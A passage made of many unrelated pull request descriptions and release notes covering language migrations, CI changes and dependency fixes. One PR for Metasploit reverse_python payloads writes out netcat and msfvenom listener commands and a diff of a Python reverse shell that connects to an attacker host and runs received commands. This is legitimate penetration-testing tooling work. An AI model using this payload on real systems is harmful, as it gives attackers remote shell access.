| | `OptionsAnalyticsTest.java` | Fixed test calls + math error in BF25 test |
| **CI/CD** | `validation-crucible.yml` | JDK 24 → JDK 21 (latest LTS) |
| **Build** | `.gitignore` | Added `.gradle/`, IDE (`.idea/`, `.vscode/`), OS (`.DS_Store`) entries |
| | `.gradle/` | Removed 24 tracked build cache files |
| | `gradle/wrapper/` | Added wrapper properties |

**Key Improvements**
- All trading-jargon abbreviations now have descriptive names with JavaDoc
- Build passes with JDK 21
- Clean version control (no local build artifacts)

**Testing**
- 28 tests passing

title: Convert Python project to Java Spring Boot with optimized CSV writing
body:
Converts the NBA odds fetcher from Python to Java 17 / Spring Boot 3.2.5 and optimizes CSV generation based on benchmarking.

## Migration

- **Stack**: Python 3.12 + `requests` + `csv.writer` → Java 17 + Spring Boot 3.2.5 + `RestTemplate`
- **Structure**: Model classes (`Game`, `Bookmaker`, `Market`, `Outcome`, `OddsRow`), services (`OddsFetcher`, `OddsParser`, `CsvWriter`), `CommandLineRunner` orchestrator
- **Docker**: Multi-stage build (Maven build → JRE 17 runtime)
- **Tests**: 14 JUnit 5 tests (13 unit + 1 benchmark)

## CSV optimization

Benchmarked 6 strategies at 200K rows × 20 iterations (3 runs). Winner: **BufferedWriter 64KB + row-level string concat**, 16–33% faster than all alternatives.

```
1) BufferedWriter 64KB + row concat    533 ms  ★ BEST
3) FileWriter + row concat             617 ms    +16%
5) In-memory StringBuilder             642 ms    +20%
6) BufferedOutputStream + getBytes     658 ms    +23%
2) BufferedWriter 64KB + direct writes 670 ms    +26%
4) PrintWriter + println               719 ms    +35%
```

**Why it wins**: 64KB buffer minimizes syscalls; Java's `invokedynamic` `StringConcatFactory` (the `+` operator since Java 9) produces an optimized single string per row → 1 `write()` call instead of 7, reducing `BufferedWriter`'s per-call synchronization overhead.

```java
// One write per row — leverages JVM-optimized string concat
writer.write(
    escapeCsv(row.getHomeTeam()) + ","
    + escapeCsv(row.getAwayTeam()) + ","
    + escapeCsv(row.getBookmaker()) + ","
    + escapeCsv(row.getOutcome()) + ","
    + row.getPrice() + "\n");
```

Full analysis with methodology and results in `docs/PERFORMANCE.md`.

title: Update CI workflows from Python to Spring Boot (Java 17 + Maven)
body:
Workflows still reference the old Python stack (`setup-python`, `pip`, `pytest`, `fetch_odds.py`) which no longer exists after the Spring Boot migration.

### Changes

- **`run_tests.yml`**: `setup-python` → `setup-java@v4` (Temurin 17, Maven cache), `pytest` → `mvn test -B`
- **`fetch_odds.yml`**: Same Java setup, builds with `mvn package -DskipTests -B`, runs with `java -jar target/fetch-odds-*.jar` (wildcard avoids hardcoded version). Preserves existing `ODDS_API_KEY` guard, schedule, and CSV artifact upload.

title: Docs: migrate sample implementation to Java and correct character set counts
body:
### Motivation

- Convert the README reference implementation from Python to Java to provide a Java-friendly sample implementation and clarify types and constants.
- Correct the reported character counts and character set to keep the total base (`BASE = 88`) consistent.

### Description

- Replaced Python code snippets with Java equivalents for mixed-radix encoding, `detail`/`n` arithmetic, and Base-88 conversions using typed variables and constants such as `BASES`, `CHARS`, and `BASE`.
- Updated variable names and types to Java idioms, including `int`, `long`, `StringBuilder`, and array iteration for `encodeDetail`/`decodeDetail` and `toBase88`/`fromBase88` implementations.
- Adjusted the hiragana and kanji counts in the spec (`43 -> 44` and `45 -> 44`) and removed the `岩` character from the Kanji list so the totals display as `44 + 44 = 88`.
- Small formatting and naming tweaks: `mesh1_group` -> `mesh1Group` and conversion arithmetic uses explicit casts and integer division as appropriate for Java.

### Testing

- No automated tests were run because this change is documentation and sample-code only.

------

title: [mlir:python] Fix crash in from_python in type casters.
body:
This PR fixes a crash due to a failed assertion in the `from_python` implementations of the type casters. The assertion obviously only triggers if assertions are enabled, which isn't the case for many Python installations, *and* if a Python capsule of the wrong type is attempted to be used, so this this isn't triggered easily. The problem is that the conversion from Python capsules may set the Python error indicator but the callers of the type casters do not expect that. In fact, if there are several operloads of a function, the first may cause the error indicator to be set and the second runs into the assertion. The fix is to unset the error indicator after a failed capsule conversion, which is indicated with the return value of the function anyways.

In alternative fix would be to unset the error indicator *inside* the `mlirPythonCapsuleTo*` functions; however, their documentations does say that the Python error indicator is set, so I assume that some callers may *want* to see the indicator and that the responsibility to handle it is on them.

title: ⚡ Bolt: implement arena allocator pattern to replace self-referential structs
body:
This PR adds a comprehensive implementation of the **Self-Referential Data Structures (Arena Allocator / Indices)** pattern, addressing a core paradigm shift needed when moving from Java/Python/C++ to Rust. It demonstrates how to effectively build graphs and complex structures using contiguous memory and stable indices, thereby sidestepping borrow checker errors and avoiding memory leaks associated with `Rc<RefCell<T>>` soups.

Additionally, this PR fixes a pre-existing failing test in `src/concurrency/thread_local.rs` which was blocking the `cargo test` suite from succeeding.

---

title: fix(python): pin typing_extensions so python-ulid 3.x imports under Python 3.12
body:
## Summary

`graph_universe_sync` (and `sde_importer`, for the same reason) crashes at import time inside the container with:

```
File "/usr/local/lib/python3.12/site-packages/ulid/__init__.py", line 16
    from typing_extensions import Self
ModuleNotFoundError: No module named 'typing_extensions'
```

Root cause: `python-ulid` 3.0.x has an unconditional `from typing_extensions import Self` but only declares `typing_extensions` as a runtime dep when `python_version < "3.11"`. Our base image is `python:3.12-slim`, so pip never pulls it in and the import explodes the moment `outbox.py` is loaded.

Fix: pin `typing_extensions>=4.7` explicitly in both `python/requirements-graph.txt` and `python/requirements-sde.txt`. Cheap pure-Python wheel; can drop it once python-ulid removes the unconditional import.

Surfaces affected:
- `make neo4j-sync-universe` (graph_universe_sync) — was the original repro.
- `make sde-import` (sde_importer) — same code path; would have hit the same crash on its next outbox emit.

## Test plan

- [ ] `make neo4j-sync-universe` runs to completion (no `ModuleNotFoundError`).
- [ ] `make sde-import` still runs cleanly (regression sanity check).

title: Add python to local dev env and update python stack
body:
## Summary

This PR makes the local Python development story more useful for both product users and maintainers working on proxy-side Python code.

- add a dedicated Python test environment in `Dockerfile.dev` for local proxy-addon work, including `mitmproxy`, `pytest`, and `PyYAML`
- make the shipped Python stack more practical for default-deny sandbox use by documenting Debian `venv` behavior, PEP 668 limits, and the offline `--system-site-packages` workflow
- remove `pipx` from the shipped Python stack and simplify the Python path layout around `~/.local/bin`
- move Go-installed tools to `$HOME/go/bin` and update the Go stack docs and local compose mounts so Go tools do not mask agent binaries such as `codex`
- add common Python local-dev artifacts to `.gitignore`
- refresh README language around supported agents and clarify that public package registries such as PyPI remain opt-in
- normalize the local compose files for this repo's dev environment

title: Python: Fix python-feature-lifecycle skill YAML frontmatter
body:
### Motivation and Context

The python-feature-lifecycle skill fails to load with: missing or malformed YAML frontmatter.

### Description

A copyright comment preceded the YAML frontmatter --- delimiter in SKILL.md, preventing the skill from being parsed. The --- block must be on the very first line of the file.

This PR removes the copyright comment so the frontmatter is valid, matching all other skill files in the repo.

### Contribution Checklist

title: fix: disable %check for python-azure-mgmt-core, python-ftfy, python-msrest, python-troveclient, python-webob, python-zmq
body:
This PR adds these components to the check-skip-initial-failures group in component-check-disablement.toml to skip %check and fix the following failures:

- `python-azure-mgmt-core`: AZL buildroot has `azure-core 1.38.0` (vs Fedora's `1.34.0`); the newer version changed serialization format, breaking test assertions
- `python-ftfy`: AZL buildroot has `wcwidth 0.6.0` (vs Fedora's `0.2.13`); the newer version changed `SOFT HYPHEN` width from 0 to 1
- `python-msrest`, `python-troveclient`: `Python 3.14.3` behavioral changes (mock call_count, argparse internals) (vs Fedora's `3.14.0rc3`)
- `python-webob`, `python-zmq`: Flaky/timing-sensitive tests

Validation: [Koji build](https://controltower-dev-jwisitgpr74k6-gjb0fchvgkbnamgp.b01.azurefd.net/workflow/555c74f5-31fe-4b38-4088-08de902fbf2b)

title: Move cq-python into sdk/python/
body:
## Summary

- Copies the Python SDK from the standalone [`cq-python`](https://github.com/mozilla-ai/cq-python) repo into `sdk/python/`
- Drops proto stubs (`cqpb/`) and protobuf dependency; adopts JSON Schema as source of truth
- Updates all enum values to match the JSON Schema definitions from PR #171
- Renames `domain` field to `domains` (plural) throughout
- Removes legacy DB migration code (clean break)
- Wires into root Makefile (`make test-python-sdk`) and CI workflow

### Breaking changes

| Area | Before | After |
|------|--------|-------|
| Tier values | `TIER_LOCAL`, `TIER_PRIVATE`, `TIER_PUBLIC` | `local`, `private`, `public` |
| Flag reasons | `FLAG_REASON_STALE`, etc. | `stale`, `incorrect`, `duplicate` |
| UNSPECIFIED variants | Present | Removed |
| Domain field | `domain` (singular) | `domains` (plural) |
| Existing local DBs | Auto-migrated | Manual migration script (#175) |

### Related issues

- #175 -- migration script for existing local databases
- #172 -- structured warnings (tracked, not in scope)
- #173 -- configurable timeout (tracked, not in scope)
- #174 -- relevance clamping (tracked, not in scope)

## Test plan

- [x] All 230 Python SDK tests pass
- [x] Ruff lint + format pass
- [x] Schema validation passes
- [x] `make test-python-sdk` works from repo root

Part 2 of the monorepo consolidation. Next: move `cq-go` → `sdk/go/` + `cli/` (PR 3).

title: Python 3 compatibility
body:
This PR updates the library for compatibility with Python 3.

* Unlike https://github.com/ocelma/python-itunes/pull/17 (which I referenced – thanks, @talolard), it drops Python 2 compatibility. (I think at this point it's probably safe to discourage people still running Python 2 from connecting those machines to the Internet!)
* It replaces the `setup.py` library definition with [a `pyproject.toml` file](https://packaging.python.org/en/latest/guides/writing-pyproject-toml/). This does change the development workflow a bit (requires an editable installation into a venv), but shouldn't have any ramifications for downstream consumers of the library.
* [Nose](https://nose.readthedocs.io/en/latest/) has been totally discontinued, and doesn't even import in Python 3.12+ due to a dependency on [imp](https://docs.python.org/3/library/imp.html), so unit tests have been rewritten to use [pytest](https://docs.pytest.org/en/stable/). I've also added a GitHub Actions workflow to run them automatically.

If merged, this would supersede https://github.com/ocelma/python-itunes/pull/17 and https://github.com/ocelma/python-itunes/pull/30.

Please note also the message of the first commit in the series:

> I've specified the “GPL-3.0-or-later” license on the basis that, at the
> time it was committed, the license URL in `setup.py` linked to [the text
> of GPL 3.0], and in my experience, “or later” is the typical expectation
> of forward GPL version compatibility when left unspecified.

If you can provide confirmation or clarification of your intent, @ocelma, I'll happily reword the message to be less speculative.

[the text of GPL 3.0]: https://web.archive.org/web/20110629093753/http://www.gnu.org/copyleft/gpl.html

title: Fix `ChangeType` `UnsupportedOperationException` on JS `FunctionCall` nodes
body:
## Motivation

When running Java recipes (e.g., `NoGuavaPredicate` → `ChangeType`) against repositories containing JavaScript files, `ChangeType.postVisit()` throws `UnsupportedOperationException` on `JS.FunctionCall` nodes. This was discovered in flagship recipe run alerts on app.moderne.io — the "Java best practices" recipe run against Netflix+Spring org produced 46 per-file errors on `metaflow/plugins/cards/ui/prism.js`.

The root cause: `ChangeType.postVisit()` has explicit handling for `J.MethodInvocation` and `J.NewClass` (both `MethodCall` implementations), but `JS.FunctionCall` — also a `MethodCall` — falls through to the generic `TypedTree` branch, which calls `withType()`. All `MethodCall` implementations throw `UnsupportedOperationException` on `withType()` because the type is derived from the method type.

Additionally, `J.ClassDeclaration.type` (a `JavaType.FullyQualified`) was not being serialized over RPC, causing JavaScript class declarations to lose their type attribution when crossing the RPC boundary.

## Summary

- Add a `MethodCall` catch-all branch in `ChangeType.postVisit()` between the `J.NewClass` and `TypedTree` branches, using `withMethodType()` instead of `withType()`
- Add `J.ClassDeclaration.type` to the RPC sender/receiver in all language implementations (Java, TypeScript, C#, Python)
- Add `ChangeTypeAdaptabilityTest` in `rewrite-javascript` that verifies `ChangeType` can handle JS source containing `FunctionCall` nodes

## Test plan

- [x] New `ChangeTypeAdaptabilityTest.functionCallDoesNotThrow()` — applies `ChangeType("Foo", "Bar", false)` to JavaScript containing a class with a method returning a function, verifying both the class rename and that `JS.FunctionCall` nodes don't cause exceptions
- [x] Existing `ChangeTypeTest` in `rewrite-java-test` passes
- [x] Existing `ChangeTypeAdaptabilityTest` in `rewrite-groovy` passes
- [x] Existing `ChangeTypeTest` in `rewrite-kotlin` passes

title: Restructure repo: move Python to python/, add Java 21 port in java/
body:
Splits the single-file Python tool into a proper `python/` subdirectory and adds a parallel Java 21 implementation in its own `java/` directory, each with full build tooling and cross-platform scripts.

## Python (`python/`)
- Moved `xmlcompare.py`, `tests/`, `samples/`, `requirements.txt` from repo root into `python/`
- Added `build.sh/.bat/.ps1` — creates venv, installs deps, runs pytest
- Added `run.sh/.bat/.ps1` — activates venv and delegates to `xmlcompare.py`

## Java (`java/`)
- Full port of all comparison logic in `com.xmlcompare` package: `CompareOptions`, `Difference`, `XmlCompare`, `Main`
- DOM-based XML parsing (`javax.xml`), picocli for CLI, Jackson for JSON/YAML config
- Identical feature set: numeric tolerance, namespace stripping, ordered/unordered children, skip-keys/pattern, XPath filter, text/JSON/HTML output, `--config` file, exit codes 0/1/2
- Dual build: Gradle (`build.gradle` + wrapper) and Maven (`pom.xml` with shade plugin for fat JAR)
- Added `build.sh/.bat/.ps1` — runs both Gradle and Maven builds
- Added `run.sh/.bat/.ps1` — invokes the fat JAR via `java -jar`
- 55 JUnit 5 tests covering all major code paths

## Docs & housekeeping
- Root `README.md` rewritten to describe the two-language layout with quick-start commands for each
- `.gitignore` updated: Python `.venv/`, Java `build/`/`target/` per-project rather than repo-global `build/`

```bash
# Python
cd python && ./build.sh
./run.sh --files samples/orders_expected.xml samples/orders_actual_diff.xml --output-format json

# Java
cd java && ./build.sh
./run.sh --files samples/orders_expected.xml samples/orders_actual_diff.xml --output-format json
```

title: Port PCTSEA Java tool to Python CLI application with full tests
body:
This pull request introduces the initial implementation of the PCTSEA (Proteomics Cell Type Single-cell Enrichment Analysis) Python package. It adds the core CLI, configuration, cell type ontology logic, and project setup necessary for running the analysis pipeline. The most important changes are grouped below.

**Project setup and configuration:**

* Added `pyproject.toml` with project metadata, dependencies, build configuration, and development tools, ensuring the package is ready for installation and development. (`pctsea-python/pyproject.toml`)
* Added `.gitignore` and `.python-version` files to manage Python environment and versioning. (`pctsea-python/.gitignore`, `.python-version`) [[1]](diffhunk://#diff-207e4ab656403ee1ebd790cd2dd77356efba7b6ded15b49bd92fc5c82f94ada2R1-R8) [[2]](diffhunk://#diff-02b16bdc82ea3d804c824a6ff312f09397e04f687fdc2b1167df94d7a601763eR1)

**Core package and CLI:**

* Implemented the main CLI entry point in `cli.py`, enabling users to run the PCTSEA pipeline with various options for scoring, thresholds, database connection, and output. (`pctsea-python/src/pctsea/cli.py`)
* Added package initialization and versioning in `__init__.py`. (`pctsea-python/src/pctsea/__init__.py`)

**Cell type ontology and configuration:**

* Implemented hierarchical cell type mapping, typo correction, and normalization logic in `cell_types.py`, supporting robust cell type resolution and classification. (`pctsea-python/src/pctsea/cell_types.py`)
* Defined enums and constants for scoring methods, cell type hierarchy, and input data types in `config.py`, centralizing configuration for the analysis pipeline. (`pctsea-python/src/pctsea/config.py`)

body:
- **fix(unit-test): support 3.12 for now**

## Description

[Provide a brief description of the changes in this PR]

### Type of Change

- [ ] Bug fix (non-breaking change which fixes an issue)
- [ ] New feature (non-breaking change which adds functionality)
- [ ] Breaking change (fix or feature that would cause existing functionality to not work as expected)
- [ ] Documentation update (Is there an addition/change in API Request, Response? If yes, documentation is required)
- [ ] Performance improvement

title: Drop Python 3.9, add Python 3.14 support
body:
This updates the repository’s declared/tested Python support to include 3.14 and aligns the surrounding tooling/docs metadata with that support level. It also adjusts request tests for Python 3.14’s event-loop behavior without changing runtime code.

- **Packaging and support metadata**
  - Add the `Programming Language :: Python :: 3.14` classifier in `pyproject.toml`
  - Extend `.python-version` to include `3.14` so multi-version checks exercise it

- **Docs and tooling alignment**
  - Move docs-related Python pins from `3.13` to `3.14` in:
    - `.readthedocs.yml`
    - `scripts/docs`
    - `scripts/serve`

- **Request test compatibility on 3.14**
  - Keep `pybotters/request.py` unchanged
  - Update `tests/test_request.py` to pass an explicit mock loop when constructing standalone `ClientRequest` instances outside an active event loop

```python
req = ClientRequest(
    method,
    url,
    params=None,
    headers=None,
    data=data,
    auth=None,
    loop=Mock(),
)
```

title: multi python support for cmd/unix/reverse_python and cmd/unix/reverse_python_ssl
body:
Fixes #19811

This PR adds support for multiple python binaries for cmd/unix/reverse_python and cmd/unix/reverse_python_ssl as mentioned in the issue above.

I am re-opening a merge request from another account because my previous account "jeanmtr" was suspended and all traces of its activities were deleted ( i do not know the reason behind the suspension). Sorry for any inconvenience this may cause. 



## Verification

List the steps needed to make sure this thing works
for reverse_python : 

- [x] Run `nc -lvnp 4444`
- [x] Run `msfvenom -p cmd/unix/reverse_python LHOST=[host to test]`
- [x] **Verify** if the reverse shell is working 


for reverse_python_ssl : 

- [x] Generate ssl key and cert
- [x] Run `openssl s_server -accept 4444 -cert server.crt -key server.key -quiet`
- [x] Run `msfvenom -p cmd/unix/reverse_python_ssl LHOST=[host to test]`
- [ ] **Verify** if the reverse shell is working 


However there is an unrelated incompatibility with python version higher than 3.12, the ssl.wrap_socket method was removed. Here is a proposed fix that would fix it, i think the same issue is present in `modules/payloads/singles/python/shell_reverse_tcp_ssl.rb `. I don't know if i should open a separate issue or not so i will just put the diff here.

```diff
@@ -54,16 +54,19 @@ module MetasploitModule
     # Set up the socket
     cmd += "import socket,subprocess,os,ssl\n"
     cmd += "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
+    cmd += "context=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n"
+    cmd += "context.check_hostname = False\n"
+    cmd += "context.verify_mode = ssl.CERT_NONE\n"
     cmd += "so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n"
-    cmd += "s=ssl.wrap_socket(so)\n"
+    cmd += "so = context.wrap_socket(so)\n"
     # The actual IO
     cmd += "#{dead}=False\n"
     cmd += "while not #{dead}:\n"
-    cmd += "\tdata=s.recv(1024)\n"
+    cmd += "\tdata=so.recv(1024)\n"
     cmd += "\tif len(data)==0:\n\t\t#{dead} = True\n"
     cmd += "\tproc=subprocess.Popen(data.decode('utf-8'),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n"
     cmd += "\tstdout_value=proc.stdout.read() + proc.stderr.read()\n"
-    cmd += "\ts.send(stdout_value)\n"
-    "#{datastore['PythonPath']} -c \"#{py_create_exec_stub(cmd)}\""
+    cmd += "\tso.send(stdout_value)\n"
+    "echo #{Shellwords.escape(py_create_exec_stub(cmd))} | #{datastore['PythonPath']} -"
   end
 end
```

title: [Python] Only use Python Limited C API in ROOT Pythonizations library
body:
This follows up on 4e0c7bf0dda25984c, swapping out the remaining use of CPython API functions that were not inside the limited API.

In the cases where we're sill using private headers from cppyy, the parts of these headers that don't compile with the limited API are excluded via the `Py_LIMITED_API` preprocessor macro.

title: feat: Migrate Bloom API from Java/Spring Boot to Python/FastAPI
body:
## 🌿 feat: Migrate Bloom API from Java/Spring Boot to Python/FastAPI

### What
Complete backend migration from Java 17 + Spring Boot 3.4.4 to Python + FastAPI.
All 14 API endpoints preserved with identical request/response contracts.

### Why
- Align with VibeSpace LLC technology standards (Python-first for consumer products)
- Faster iteration speed for Sprint 2 feature development
- Native async support for future AI integration features
- Reuse VibeConnect infrastructure patterns

### Changes
- **Removed**: Java/Spring Boot backend (pom.xml, all .java files, Maven wrapper)
- **Added**: FastAPI application with SQLAlchemy 2.0 async, Alembic migrations
- **Preserved**: All API endpoints, response shapes, auth flow, database schema
- **Fixed**: Profile update bug (creating profile without user relationship)
- **Archived**: Java code preserved at [spy-sauce/bloom-labs-java](https://github.com/spy-sauce/bloom-labs-java)

### Endpoint Parity (14 endpoints)
| Method | Path | Auth |
|--------|------|------|
| POST | /api/auth/signup | No |
| POST | /api/auth/verify-email | No |
| POST | /api/auth/resend-code | No |
| POST | /api/auth/login | No |
| POST | /api/auth/refresh | No (cookie) |
| POST | /api/auth/logout | No (cookie) |
| GET | /api/handles/check/{handle} | No |
| POST | /api/handles/claim | Yes |
| GET | /api/profile/me | Yes |
| PUT | /api/profile/me | Yes |
| GET | /api/profile/me/socials | Yes |
| POST | /api/profile/me/socials | Yes |
| DELETE | /api/profile/me/socials/{id} | Yes |
| GET | /api/card/{handle} | No |

### Stack
Python 3.12+ | FastAPI 0.115+ | SQLAlchemy 2.0 | asyncpg | Alembic | Redis 5.2+

### Testing
- [ ] All 14 endpoints return identical responses to Sprint 1
- [ ] JWT access/refresh flow works with existing frontend
- [ ] Redis verification codes + token blacklisting functional
- [ ] Docker-compose infra unchanged (Postgres 5433, Redis 6380)
- [ ] Frontend (`apps/web/`) works without modification

🤖 Generated with [Claude Code](https://claude.com/claude-code)

title: Add synthetic Python tests covering many Python constructs
body:
This PR adds 326 Python tests that cover many Python constructs. Each test is simple and follows the same structure:
```python
def some_function():
   # do some computation
   assert(...)       # This assert must be proven valid

some_function()
```
The tests that can be analyzed with Strata and for which the assert is proven valid (99 tests) are in the `tests/` directory, with an `expected` file. The tests that do not yet pass with Strata (either failing with internal errors or the assert cannot be proven) are in the `pending/` directory, and are not launched by the CI test framework.

By submitting this pull request, I confirm that you can use, modify, copy, and redistribute this contribution, under the terms of your choice.

title: Feature/python sdk
body:
## Description
This pull request introduces comprehensive support for Python within Matimo, bringing the Python SDK to full feature parity with the TypeScript SDK. It updates documentation, CI/CD workflows, and developer tooling to support both TypeScript and Python, and adds new workflows for testing and publishing the Python SDK and providers. The most important changes are grouped below:

**Python SDK introduction and documentation:**
- Added references to the Python SDK in `README.md`, including installation instructions, minimal usage example, and updated feature lists to reflect full Python support. Also added links to the Python SDK documentation. [[1]](diffhunk://#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5R13-R17) [[2]](diffhunk://#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5R39-R48) [[3]](diffhunk://#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5L57-R82) [[4]](diffhunk://#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5R103) [[5]](diffhunk://#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5R124) [[6]](diffhunk://#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5L155-R182) [[7]](diffhunk://#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5R197-R214) [[8]](diffhunk://#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5L254) [[9]](diffhunk://#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5R346)

**CI/CD and workflow enhancements:**
- Updated `.github/workflows/ci.yml` to split TypeScript and Python testing into separate jobs, added Python linting, type checking, and coverage reporting, and upgraded all GitHub Actions to their latest major versions. [[1]](diffhunk://#diff-b803fcb7f17ed9235f1e5cb1fcd2f5d3b2838429d4368ae4c57ce4436577f03fL10-R24) [[2]](diffhunk://#diff-b803fcb7f17ed9235f1e5cb1fcd2f5d3b2838429d4368ae4c57ce4436577f03fL34-R34) [[3]](diffhunk://#diff-b803fcb7f17ed9235f1e5cb1fcd2f5d3b2838429d4368ae4c57ce4436577f03fL43-R101)
- Added `.github/workflows/test-python.yml` for dedicated Python SDK testing on pushes and pull requests, including linting, type checking, and coverage upload.
- Added `.github/workflows/publish-python.yml` to automate publishing of the core Python SDK and provider packages to PyPI, with test gates and OIDC trusted publishing.
- Updated `.github/workflows/npm-release.yml` to ensure all steps run in the `typescript` directory and upgraded actions for consistency. [[1]](diffhunk://#diff-aad3b21c2ed02fc778a85762a45f71b12bd5b6ee7732ca75c6cb46d5d73aa485L21-R27) [[2]](diffhunk://#diff-aad3b21c2ed02fc778a85762a45f71b12bd5b6ee7732ca75c6cb46d5d73aa485L38-R59)
- Improved `.github/workflows/tool-validation.yml` to validate tool YAML files in both TypeScript and Python provider directories, and run all steps in the appropriate working directory. [[1]](diffhunk://#diff-599a11e3cd7eb62323ba7191ee96c466f6ab932b6cd90433770f96f17439b28eL6-R7) [[2]](diffhunk://#diff-599a11e3cd7eb62323ba7191ee96c466f6ab932b6cd90433770f96f17439b28eR41-R49)
- Added `.github/workflows/update-changelog.yml` to automatically prepend release notes to the changelog on new releases.

**Developer tooling improvements:**
- Enhanced `.husky/pre-commit` and `.husky/pre-push` hooks to lint, format, and test both TypeScript and Python codebases, conditionally running Python checks if `uv` is available. [[1]](diffhunk://#diff-d2bc4bbf14eadc292d84e0ef5f7a93115c23557f533809fc80b896934291529dL3-R17) [[2]](diffhunk://#diff-43bbc75a027a43baaddc57670d8ab49b4aa2981053c3cabba17567723d3a9fb6L3-R20)

These changes ensure that the project now fully supports Python alongside TypeScript, with robust CI/CD, clear documentation, and improved developer experience.
## Type of Change
- [ ] Bug fix
- [x] New feature
- [x] Breaking change
- [x] Documentation update
- [x] Tool addition
- [x] Tool modification

## Testing
- [x] Tests added
- [x] All tests passing
- [x] Coverage maintained (>90%)

## Checklist
- [x] Code formatted (`pnpm format`)
- [x] Linting passes (`pnpm lint`)
- [x] Tests passing (`pnpm test`)
- [x] Documentation updated
- [x] No console.log statements

pytest 9.0.3 (2026-04-07)

  • #14255: TOML integer log levels must be quoted: Updating reference documentation.

Contributor-facing changes

Updates `chardet` from 5.2.0 to 7.4.2
Release notes

Sourced from chardet's releases.

7.4.2

Patch release: fixes a crash on short inputs and closes a bunch of WHATWG/IANA alias gaps.

Bug Fixes

  • Fixed RuntimeError: pipeline must always return at least one result on ~2% of all possible two-byte inputs (e.g. b"\xf9\x92"). Multi-byte encodings like CP932 and Johab could score above the structural confidence threshold on very short inputs, but then statistical scoring would return nothing, leaving an empty result list instead of falling through to the fallback. (#367, #368, thanks @​jasonwbarnett)

Improvements

  • Added ~90 encoding aliases from the WHATWG Encoding Standard and IANA Character Sets registry so that <meta charset> labels like x-cp1252, x-sjis, dos-874, csUTF8, and the cswindows* family all resolve correctly through the markup detection stage. Every alias was driven by a failing spec-compliance test, not speculative. (#366)
  • Added a spec-compliance test suite covering Python decode round-trips for all 86 registry encodings, WHATWG label resolution, IANA preferred MIME names, and Unicode/RFC conformance (BOM sniffing, UTF-8 boundary cases, UTF-16 surrogate pairs). This is the test suite that would have caught the 7.4.1 BOM bug before release. (#366)

Full Changelog: https://github.com/chardet/chardet/compare/7.4.1...7.4.2

7.4.1

Bug Fixes

  • BOM-prefixed UTF-16/32 input now returns utf-16/utf-32 instead of utf-16-le/utf-16-be/utf-32-le/utf-32-be. The endian-specific codecs don't strip the BOM on decode, so callers were getting a stray U+FEFF at the start of their text. BOM-less detection is unchanged. (#364, #365)

Full Changelog: https://github.com/chardet/chardet/compare/7.4.0...7.4.1

chardet 7.4.0 brings accuracy up to 99.3% (from 98.6% in 7.3.0) and significantly faster cold start thanks to a new dense model format.

What's New

Performance:

  • New dense zlib-compressed model format (v2) drops cold start (import + first detect) from ~75ms to ~13ms with mypyc

Accuracy (98.6% → 99.3%):

  • Eliminated train/test data overlap via content fingerprinting
  • Added MADLAD-400 and Wikipedia as supplemental training sources
  • Improved non-ASCII bigram scoring: high-byte bigrams are now preserved during training and weighted by per-bigram IDF
  • Encoding-aware substitution filtering (substitutions only apply for characters the target encoding can't represent)
  • Increased training samples from 15K to 25K per language/encoding pair

Bug fixes:

  • Added dedicated structural analyzers for CP932, CP949, and Big5-HKSCS (these were previously sharing their base encoding's byte-range analyzer, missing extended ranges)

Metrics

chardet 7.4.0 (mypyc) chardet 6.0.0 charset-normalizer 3.4.6
Accuracy (2,517 files) 99.3% 88.2% 85.4%
Speed 551 files/s 12 files/s 376 files/s
Language detection 95.7% 40.0% 59.2%

Full changelog: https://chardet.readthedocs.io/en/latest/changelog.html

7.3.0

... (truncated)

Changelog

Sourced from chardet's changelog.

7.4.2 (2026-04-12)

Bug Fixes:

  • Fixed RuntimeError: pipeline must always return at least one result on ~2% of all possible two-byte inputs (e.g. b"\xf9\x92"). Multi-byte encodings like CP932 and Johab could score above the structural confidence threshold on very short inputs, but then statistical scoring would return nothing, leaving the pipeline with an empty result list instead of falling through to the no_match_encoding fallback. (Jason Barnett <https://github.com/jasonwbarnett>_ via Claude, [#367](https://github.com/chardet/chardet/issues/367) <https://github.com/chardet/chardet/issues/367>, [#368](https://github.com/chardet/chardet/issues/368) <https://github.com/chardet/chardet/pull/368>)

Improvements:

  • Added ~90 encoding aliases from the WHATWG Encoding Standard and IANA Character Sets registry so that <meta charset> labels like x-cp1252, x-sjis, dos-874, csUTF8, and the cswindows* family all resolve correctly through the markup detection stage. Every alias was driven by a failing spec-compliance test. (Dan Blanchard <https://github.com/dan-blanchard>_ via Claude, [#366](https://github.com/chardet/chardet/issues/366) <https://github.com/chardet/chardet/pull/366>_)
  • Added a spec-compliance test suite covering Python decode round-trips for all 86 registry encodings, WHATWG web-platform label resolution, IANA preferred MIME names, and Unicode/RFC conformance (BOM sniffing, UTF-8 boundary cases, UTF-16 surrogate pairs). This is the test suite that would have caught the 7.4.1 BOM bug before release. (Dan Blanchard <https://github.com/dan-blanchard>_ via Claude, [#366](https://github.com/chardet/chardet/issues/366) <https://github.com/chardet/chardet/pull/366>_)

7.4.1 (2026-04-07)

Bug Fixes:

  • BOM-prefixed UTF-16 and UTF-32 input now reports utf-16 and utf-32 instead of the endian-specific variants. Python's utf-16-le/utf-16-be/utf-32-le/utf-32-be codecs keep the BOM as a U+FEFF in the decoded string, while utf-16/utf-32 strip it, so callers passing the detection result directly to .decode() were getting a stray BOM at the start of their text. BOM-less UTF-16/32 detection (via null-byte patterns) is unchanged and still returns the endian-specific name. (Dan Blanchard <https://github.com/dan-blanchard>_ via Claude, [#364](https://github.com/chardet/chardet/issues/364) <https://github.com/chardet/chardet/issues/364>, [#365](https://github.com/chardet/chardet/issues/365) <https://github.com/chardet/chardet/pull/365>)

... (truncated)

title: Port schedule/duplicate_error test to all SDK languages
body:
## Summary
